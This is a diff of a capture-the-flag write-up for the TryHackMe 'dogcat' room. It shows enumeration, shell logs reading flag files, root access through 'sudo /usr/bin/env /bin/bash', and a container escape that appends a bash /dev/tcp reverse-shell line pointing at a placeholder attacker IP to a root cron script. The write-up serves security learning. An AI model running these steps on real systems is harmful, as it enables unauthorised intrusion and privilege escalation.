@@ -55,7 +55,7 @@ Let's see the code source of the pages you can use inspector in the web browser 
 
 ![Desktop View](/source-code.webp){: width="1200" height="450" }
 
-{% include embed/video.html src='/explained-video.mp4' %}
+{% include embed/video.html src='/explained-video.mp4' % loop=true}
 
 ## **WebPage Enumeration**
 
@@ -72,8 +72,84 @@ http://10.10.234.138 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTP
 2. HTTPServer[Debian Linux]
 3. PHP[7.4.3]
 
-Consequence 
+> you can do some research about this information to find if there are any vulns can you used
+{: .prompt-tip}
 
-## **Gobuster brute-forcing directories**
+
+## **Reverse Shell From LFI**
+
+![Desktop View](/ls-dogcat-ctf.webp){: width="1200" height="450" }
+![Desktop View](/reverse-shell-dogcat-ctf.webp){: width="1200" height="450" }
+
+```console 
+www-data@1e8fecd5cd10:/var/www/html$ ls
+ls
+cat.php
+cats
+dog.php
+dogs
+flag.php
+index.php
+style.css
+www-data@1e8fecd5cd10:/var/www/html$ cat flag.php
+cat flag.php
+<?php
+$flag_1 = "THM{**********************}"
+?>
+www-data@1e8fecd5cd10:/var/www/html$ cd ..
+www-data@1e8fecd5cd10:/var/www/html$ ls
+flag2_QMW7JvaY2LvK.txt
+
+```
+
 ```console
+www-data@1e8fecd5cd10:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on 1e8fecd5cd10:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 1e8fecd5cd10:
+    (root) NOPASSWD: /usr/bin/env
+
+```
+
+```console
+www-data@1e8fecd5cd10:/var/www/html$ sudo /usr/bin/env /bin/bash
+
+pwd
+/root
+ls      
+flag3.txt
+cat flag3.txt
+
+```
+```console
+ls -al
+.
+..
+.dockerenv
+...
+
+```
+
+```console
+ls opt
+backups
+cd opt/backups
+ls
+backup.sh
+backup.tar
+cat backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+So now we just need another reverse shell after we need to add `echo "bash -i >& /dev/tcp/<IP_attacker>/<Port> 0>&1" backup.sh"`
+ 
+ ```console 
+ root@dogcat:~# ls
+ ls
+container
+flag4.txt
+cat flag4.txt
 ```
